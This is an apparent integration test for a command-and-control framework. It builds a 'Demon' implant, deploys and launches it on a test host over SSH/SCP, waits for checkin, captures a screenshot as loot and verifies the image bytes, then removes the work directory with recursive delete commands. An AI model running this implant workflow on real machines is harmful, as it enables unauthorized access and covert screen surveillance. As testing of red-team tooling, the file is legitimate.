"""
Scenario 08_screenshot: Screenshot capture

Take a screenshot via agent and verify a loot entry of type 'screenshot' is
created, then download the bytes and validate the image header.

Steps:
  1. Create + start HTTP listener
  2. Build Demon EXE (x64) for Windows target
  3. Deploy via SSH/SCP to Windows test machine
  4. Execute payload in background on target
  5. Wait for agent checkin
  6. Send screenshot command via agent exec
  7. Wait for a new loot entry of type 'screenshot' to appear
  8. Download screenshot bytes → verify PNG or BMP header
  9. Kill agent, stop listener, clean up

Note: screenshot capture requires an active display session.  This scenario
targets the Windows test machine which runs an interactive user session.
Headless Linux targets are skipped unless ctx.linux is configured with an
Xvfb display (DISPLAY env var set in targets.toml).

Skip if ctx.windows is None (and ctx.linux is None or lacks display config).
"""

DESCRIPTION = "Screenshot capture"

import base64
import os
import tempfile
import uuid


# ── image header signatures ──────────────────────────────────────────────────

# PNG: 8-byte magic
_PNG_HEADER = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
# BMP: 2-byte magic
_BMP_HEADER = b"BM"
# JPEG: JFIF/EXIF marker
_JPEG_HEADER = bytes([0xFF, 0xD8, 0xFF])


def _is_valid_image(data: bytes) -> tuple[bool, str]:
    """Return (ok, format_name) if data starts with a recognised image header."""
    if data[:8] == _PNG_HEADER:
        return True, "PNG"
    if data[:2] == _BMP_HEADER:
        return True, "BMP"
    if data[:3] == _JPEG_HEADER:
        return True, "JPEG"
    return False, "unknown"


def _short_id() -> str:
    """Return a short unique hex suffix to avoid name collisions across test runs."""
    return uuid.uuid4().hex[:8]


def _target_for_screenshot(ctx):
    """
    Return (target, payload_fmt, is_windows).

    Prefers Windows (has an interactive display session by default).
    Falls back to Linux if ctx.linux is configured and has a DISPLAY
    setting in targets.toml (indicating Xvfb or similar is available).
    Returns (None, None, None) if no suitable target is found.
    """
    if ctx.windows is not None:
        return ctx.windows, "exe", True
    # Linux fallback: only attempt if a DISPLAY is configured.
    if ctx.linux is not None:
        display = getattr(ctx.linux, "display", None) or ctx.env.get("linux", {}).get("display")
        if display:
            return ctx.linux, "bin", False
    return None, None, None


def run(ctx):
    """
    ctx.cli     — CliConfig (red-cell-cli wrapper)
    ctx.linux   — TargetConfig | None
    ctx.windows — TargetConfig | None
    ctx.env     — raw env.toml dict
    ctx.dry_run — bool

    Raises AssertionError with a descriptive message on any failure.
    Skips silently when no suitable target is configured.
    """
    target, payload_fmt, is_windows = _target_for_screenshot(ctx)
    if target is None:
        print(
            "  [skip] no suitable screenshot target configured — "
            "need Windows target or Linux with DISPLAY/Xvfb"
        )
        return

    from lib.cli import (
        CliError,
        agent_exec,
        agent_kill,
        agent_list,
        listener_create,
        listener_delete,
        listener_start,
        listener_stop,
        loot_download,
        loot_list,
        payload_build,
    )
    from lib.deploy import ensure_work_dir, execute_background, run_remote, upload
    from lib.wait import poll, TimeoutError as WaitTimeout

    cli = ctx.cli
    uid = _short_id()
    target_label = "Windows" if is_windows else "Linux"
    listener_name = f"test-screenshot-{uid}"
    listener_port = ctx.env.get("listeners", {}).get(
        "windows_port" if is_windows else "linux_port", 19082 if is_windows else 19081
    )

    if is_windows:
        remote_payload = f"{target.work_dir}\\agent-{uid}.exe"
    else:
        remote_payload = f"{target.work_dir}/agent-{uid}.bin"

    # Snapshot pre-existing agent IDs so we can identify the new checkin.
    try:
        pre_existing_ids = {a["id"] for a in agent_list(cli)}
    except Exception:
        pre_existing_ids = set()

    # Snapshot pre-existing screenshot loot IDs to identify new entries.
    try:
        pre_existing_loot_ids = {entry["id"] for entry in loot_list(cli, kind="screenshot")}
    except Exception:
        pre_existing_loot_ids = set()

    local_payload = tempfile.mktemp(suffix="." + payload_fmt)
    local_screenshot = tempfile.mktemp(suffix=".png")

    # ── Step 1: Create + start HTTP listener ────────────────────────────────
    print(f"  [listener] creating HTTP listener {listener_name!r} on port {listener_port}")
    listener_create(cli, listener_name, "http", port=listener_port)
    listener_start(cli, listener_name)
    print("  [listener] started")

    agent_id = None
    try:
        # ── Step 2: Build Demon payload ──────────────────────────────────────
        print(f"  [payload] building Demon {payload_fmt} x64 for {target_label} target")
        result = payload_build(
            cli, agent="demon", listener=listener_name, arch="x64", fmt=payload_fmt
        )
        raw = base64.b64decode(result["bytes"])
        assert len(raw) > 0, "payload is empty"
        print(f"  [payload] built ({len(raw)} bytes)")

        with open(local_payload, "wb") as fh:
            fh.write(raw)

        # ── Step 3: Deploy via SCP ───────────────────────────────────────────
        print(f"  [deploy] ensuring work dir {target.work_dir!r} on target")
        ensure_work_dir(target)
        print(f"  [deploy] uploading payload → {remote_payload}")
        upload(target, local_payload, remote_payload)
        if not is_windows:
            run_remote(target, f"chmod +x {remote_payload}")
        print("  [deploy] uploaded")

        # ── Step 4: Execute payload in background ────────────────────────────
        print("  [exec] launching payload in background on target")
        execute_background(target, remote_payload)

        # ── Step 5: Wait for agent checkin ───────────────────────────────────
        checkin_timeout = ctx.env.get("timeouts", {}).get("agent_checkin", 60)
        print(f"  [wait] waiting up to {checkin_timeout}s for agent checkin")

        def _new_agent_appeared():
            agents = agent_list(cli)
            new = [a for a in agents if a["id"] not in pre_existing_ids]
            return new

        new_agents = poll(
            fn=_new_agent_appeared,
            predicate=lambda agents: len(agents) > 0,
            timeout=checkin_timeout,
            description=f"new {target_label} agent checkin",
        )
        agent_id = new_agents[0]["id"]
        print(f"  [wait] agent checked in: {agent_id}")

        # ── Step 6: Send screenshot command ─────────────────────────────────
        print("  [screenshot] sending screenshot command via agent exec")
        # 'screenshot' is routed to DemonCommand::CommandScreenshot (id 2510) by
        # the CLI's command_id_for() helper — not run as a shell command.
        # We do NOT use --wait because the screenshot response arrives as a loot
        # event stored in the database, not as agent stdout output.
        screenshot_result = agent_exec(cli, agent_id, "screenshot", wait=False)
        job_id = screenshot_result.get("job_id", "(unknown)")
        print(f"  [screenshot] screenshot command queued, job_id={job_id!r}")

        # ── Step 7: Wait for new loot entry of type screenshot ───────────────
        loot_timeout = ctx.env.get("timeouts", {}).get("screenshot_loot", 30)
        print(f"  [wait] waiting up to {loot_timeout}s for screenshot loot entry")

        def _new_screenshot_loot():
            entries = loot_list(cli, kind="screenshot", agent_id=agent_id)
            new = [e for e in entries if e["id"] not in pre_existing_loot_ids]
            return new

        new_loot = poll(
            fn=_new_screenshot_loot,
            predicate=lambda entries: len(entries) > 0,
            timeout=loot_timeout,
            description="screenshot loot entry",
        )
        loot_entry = new_loot[0]
        loot_id = loot_entry["id"]
        print(
            f"  [loot] screenshot loot entry created: id={loot_id}, "
            f"name={loot_entry.get('name')!r}, "
            f"size={loot_entry.get('size_bytes')} bytes"
        )

        assert loot_entry["kind"] == "screenshot", (
            f"expected loot kind 'screenshot', got {loot_entry['kind']!r}"
        )
        assert loot_entry.get("has_data", False), (
            f"loot entry {loot_id} has no binary data available for download"
        )

        # ── Step 8: Download screenshot bytes and verify image header ────────
        print(f"  [download] downloading loot #{loot_id} → {local_screenshot}")
        loot_download(cli, loot_id, local_screenshot)

        assert os.path.exists(local_screenshot), (
            "loot_download returned success but local file was not created"
        )
        file_size = os.path.getsize(local_screenshot)
        assert file_size > 0, "downloaded screenshot is empty (0 bytes)"

        with open(local_screenshot, "rb") as fh:
            header = fh.read(16)

        valid, fmt_name = _is_valid_image(header)
        assert valid, (
            f"downloaded screenshot does not have a recognised image header.\n"
            f"  First 16 bytes (hex): {header.hex()!r}\n"
            f"  Expected PNG (89504e47...), BMP (424d...), or JPEG (ffd8ff...) magic"
        )
        print(
            f"  [download] verified {fmt_name} image header, "
            f"{file_size} bytes, loot id={loot_id}"
        )

        print("  [suite] all screenshot checks passed")

    finally:
        # ── Step 9: Kill agent, stop listener, clean up ──────────────────────
        if agent_id:
            print(f"  [cleanup] killing agent {agent_id}")
            try:
                agent_kill(cli, agent_id)
            except Exception as exc:
                print(f"  [cleanup] agent kill failed (non-fatal): {exc}")

        print(f"  [cleanup] stopping/deleting listener {listener_name!r}")
        try:
            listener_stop(cli, listener_name)
        except Exception:
            pass
        try:
            listener_delete(cli, listener_name)
        except Exception:
            pass

        print("  [cleanup] removing work_dir on target")
        try:
            if is_windows:
                run_remote(target, f"rmdir /S /Q {target.work_dir}", timeout=15)
            else:
                run_remote(target, f"rm -rf {target.work_dir}", timeout=15)
        except Exception as exc:
            print(f"  [cleanup] work_dir removal failed (non-fatal): {exc}")

        for path in (local_payload, local_screenshot):
            try:
                os.unlink(path)
            except Exception:
                pass

        print("  [cleanup] done")
